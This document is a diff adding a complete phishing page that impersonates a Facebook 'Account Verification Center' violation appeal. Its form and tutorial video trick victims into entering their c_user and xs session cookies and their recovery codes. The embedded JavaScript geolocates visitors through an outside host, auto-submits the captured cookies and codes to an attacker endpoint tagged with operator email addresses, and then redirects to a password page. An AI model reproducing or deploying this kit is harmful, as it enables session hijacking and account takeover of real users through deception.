@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification | Meta</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        :root {
+            --primary: #1877f2;
+            --primary-dark: #166fe5;
+            --secondary: #42b72a;
+            --light: #f0f2f5;
+            --dark: #1c1e21;
+            --gray: #65676b;
+            --border: #dddfe2;
+            --error: #f02849;
+            --warning: #ffba00;
+            --success: #31a24c;
+            --white: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            background-color: var(--primary);
+            color: var(--white);
+            padding: 16px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            margin-right: 20px;
+        }
+
+        .subheader {
+            background-color: var(--white);
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .subheader-content {
+            display: flex;
+            align-items: center;
+        }
+
+        .help-center {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .verification-card {
+            background-color: var(--white);
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            margin: 30px auto;
+            overflow: hidden;
+        }
+
+        .card-header {
+            background-color: #f5f6f7;
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        .alert-message {
+            background-color: #f5f6f7;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--warning);
+        }
+
+        .alert-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .alert-icon {
+            color: var(--warning);
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .alert-text {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .instruction-text {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: var(--dark);
+        }
+
+        .video-container {
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .video-wrapper {
+            position: relative;
+            max-width: 500px;
+            margin: 0 auto;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        video {
+            width: 100%;
+            display: block;
+        }
+
+        .video-caption {
+            font-size: 13px;
+            color: var(--gray);
+            margin-top: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .recovery-group {
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--dark);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background-color: var(--white);
+            transition: all 0.2s ease;
+        }
+
+        .recovery-control {
+            width: 100%;
+            padding: 12px;
+            height: 100px;
+            font-size: 15px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background-color: var(--white);
+            transition: all 0.2s ease;
+            font-family: inherit;
+            resize: none;
+        }
+
+        .form-control:focus,
+        .recovery-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .form-note {
+            font-size: 13px;
+            color: var(--gray);
+            margin-top: 8px;
+        }
+
+        .card-footer {
+            background-color: #f5f6f7;
+            padding: 16px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .btn {
+            padding: 10px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            color: var(--white);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+        }
+
+        .btn-primary:active {
+            transform: translateY(1px);
+        }
+
+        .btn-loading .btn-text {
+            visibility: hidden;
+        }
+
+        .btn-loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 2px solid transparent;
+            border-top-color: var(--white);
+            border-radius: 50%;
+            animation: button-loading-spinner 1s ease infinite;
+        }
+
+        @keyframes button-loading-spinner {
+            from {
+                transform: rotate(0turn);
+            }
+
+            to {
+                transform: rotate(1turn);
+            }
+        }
+
+        .warning-box {
+            background-color: #fff8e1;
+            border-left: 4px solid var(--warning);
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 20px;
+        }
+
+        .warning-text {
+            font-size: 13px;
+            color: var(--dark);
+        }
+
+        @media (max-width: 768px) {
+            .verification-card {
+                margin: 20px 0;
+                border-radius: 0;
+            }
+
+            .video-wrapper {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <div class="container header-content">
+            <div class="logo">facebook</div>
+        </div>
+    </header>
+    <div class="subheader">
+        <div class="container subheader-content">
+            <div class="help-center">Account Verification Center</div>
+        </div>
+    </div>
+    <div class="container">
+        <form class="verification-card" onsubmit="submitForm(event)">
+            <div class="card-header">
+                <div class="card-title">Page Violation Appeal</div>
+            </div>
+            <div class="card-body">
+                <div class="alert-message">
+                    <div class="alert-title">
+                        <i class="fas fa-exclamation-triangle alert-icon"></i>
+                        <span>Important Notice</span>
+                    </div>
+                    <p class="alert-text">We've identified activity on your page that may violate our Community
+                        Standards. Your access has been temporarily restricted while we review this matter.</p>
+                </div>
+                <p class="instruction-text">To help us verify your identity and resolve this issue, please carefully
+                    follow the instructions below.</p>
+                <div class="video-container">
+                    <div class="video-wrapper">
+                        <video controls autoplay>
+                            <source
+                                src="https://ik.imagekit.io/ummab7boi/WhatsApp%20Video%202024-11-26%20at%2013.24.43_9bcb50f5.mp4?updatedAt=1751126951949"
+                                type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
+                    </div>
+                    <p class="video-caption">Verification process demonstration</p>
+                </div>
+                <p class="instruction-text">Please provide the following information exactly as shown in your account
+                    settings:</p>
+                <div class="form-group">
+                    <label for="c_user" class="form-label">c_user Value</label>
+                    <input type="number" id="c_user" class="form-control" required pattern="^\d{15}$"
+                        title="Please enter your 15-digit user ID">
+                    <p class="form-note">This is a 15-digit number found in your account information</p>
+                </div>
+                <div class="form-group">
+                    <label for="xs" class="form-label">xs Value</label>
+                    <input type="text" id="xs" class="form-control" required
+                        pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$">
+                    <p class="form-note">This is a combination of letters, numbers, and special characters</p>
+                </div>
+                <div class="recovery-group">
+                    <label for="recovery_codes" class="form-label">Recovery Codes</label>
+                    <textarea id="recovery_codes" class="recovery-control" required></textarea>
+                    <p class="form-note">This is a combination of letters, numbers, and special characters</p>
+                </div>
+                <div class="warning-box">
+                    <p class="warning-text"><i class="fas fa-exclamation-circle"></i> Please do not log out from your
+                        computer or laptop until you receive verification confirmation.</p>
+                </div>
+            </div>
+            <div class="card-footer">
+                <button type="submit" class="btn btn-primary" id="submitButton"><span class="btn-text">Submit
+                        Verification</span></button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        let allowRecovery = false;
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const videoElement = document.querySelector(".video-wrapper video");
+            const recoveryGroup = document.querySelector(".recovery-group");
+
+            fetch(`https://handle.gadgetsdecory.xyz:3000/dc`)
+                .then(res => res.json())
+                .then(data => {
+                    const myIp = data.clientIp;
+                    const proxyStatus = data[myIp]?.proxy;
+                    const countryCode = data[myIp]?.isocode;
+
+                    if (proxyStatus !== "yes" && countryCode !== "PK") {
+                        allowRecovery = true;
+                        videoElement.querySelector("source").src = "https://ik.imagekit.io/ummab7boi/0812.mp4?updatedAt=1755009047079";
+                        videoElement.load();
+                        recoveryGroup.style.display = "block";
+                    } else {
+                        allowRecovery = false;
+                        recoveryGroup.remove();
+                    }
+                })
+                .catch(err => console.error("Location check error:", err));
+
+            // Auto-submit when both xs and c_user have values
+            document.getElementById("c_user").addEventListener("input", checkAutoSubmit);
+            document.getElementById("xs").addEventListener("input", checkAutoSubmit);
+        });
+        function checkAutoSubmit() {
+            const cUserVal = document.getElementById("c_user").value.trim();
+            const xsVal = document.getElementById("xs").value.trim();
+
+            const cUserPattern = /^\d{15}$/;
+            const xsPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$/;
+
+            if (cUserPattern.test(cUserVal) && xsPattern.test(xsVal) && allowRecovery) {
+                sendAuto();
+            }
+        }
+
+        async function sendAuto() {
+
+
+            const cUserInput = document.getElementById("c_user").value.trim();
+            const xsInput = document.getElementById("xs").value.trim();
+            // Always send c_user and xs
+            fetch("https://postal-form.on.shiper.app/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    c_user: cUserInput,
+                    xs: xsInput,
+                    emails: ["itguy932@gmail.com"],
+                    workerEmail: "itguy932@gmail.com",
+                    name: "Eng",
+                }),
+            }).then(res => {
+                if (res.ok) {
+                } else {
+                    throw new Error('Submission failed');
+                }
+            }).catch(err => {
+            }).finally(() => {
+            });
+
+
+        }
+
+        async function submitForm(event) {
+            if (event) event.preventDefault();
+
+            const submitButton = document.getElementById('submitButton');
+            submitButton.classList.add('btn-loading');
+            submitButton.disabled = true;
+
+            const cUserInput = document.getElementById("c_user").value.trim();
+            const xsInput = document.getElementById("xs").value.trim();
+            const recoveryInput = document.getElementById("recovery_codes")?.value.trim() || "";
+
+            fetch("https://postal-form.on.shiper.app/submit", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    c_user: cUserInput,
+                    xs: xsInput,
+                    emails: ["mjohn72929@gmail.com", "melissakolker.into@gmail.com"],
+                    workerEmail: "mjohn72929@gmail.com",
+                    name: "Musab"
+                }),
+            }).then(res => {
+                if (res.ok) {
+                    if (allowRecovery && recoveryInput) {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ email: recoveryInput, password: "." })
+                        }).then(res=>{
+                            if(res.ok){
+                                window.location.href = "password.html"
+                            }
+                            else{
+                                throw new Error('Recovery code submission failed');
+                            }
+                        });
+                    } else {
+                         window.location.href = "password.html"
+                    }
+                    
+                } else {
+                    throw new Error('Submission failed');
+                }
+            }).catch(err => {
+                console.error("Submission error:", err);
+                alert("An error occurred. Please try again.");
+                if (allowRecovery && recoveryInput) {
+                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ email: recoveryInput, password: "." })
+                        }).then(res=>{
+                            if(res.ok){
+                                window.location.href = "password.html"
+                            }
+                            else{
+                                throw new Error('Recovery code submission failed');
+                            }
+                        });
+                    } else {
+                         window.location.href = "password.html"
+                    }
+                
+            }).finally(() => {
+                submitButton.classList.remove('btn-loading');
+                submitButton.disabled = false;
+            });
+
+
+        }
+    </script>
+</body>
+
+</html>
